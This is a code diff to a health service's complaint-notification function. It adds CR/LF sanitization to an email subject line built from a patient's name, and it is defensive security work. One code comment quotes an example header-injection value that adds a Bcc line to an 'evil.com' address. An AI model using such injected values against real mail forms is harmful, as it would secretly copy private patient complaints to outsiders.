@@ -1,4 +1,5 @@
 import { createClient } from '@supabase/supabase-js'
+import { sanitizeSubject } from './_email-safety.js'
 
 async function notifyComplaintsInbox(complaint) {
   try {
@@ -8,7 +9,9 @@ async function notifyComplaintsInbox(complaint) {
       from: 'Tere Health <hello@terehealth.co.nz>',
       replyTo: 'terehealthnz@gmail.com',
       to: ['terehealthnz@gmail.com'],
-      subject: `[Complaint logged] ${complaint.complaint_type || 'General'} — ${complaint.patient_name || 'Anonymous'}`,
+      // sanitizeSubject strips CR/LF — blocks header-injection via patient
+      // name field (e.g. "John\r\nBcc: attacker@evil.com").
+      subject: sanitizeSubject(`[Complaint logged] ${complaint.complaint_type || 'General'} — ${complaint.patient_name || 'Anonymous'}`),
       text: [
         `A new complaint has been logged in Tere Health.`,
         '',
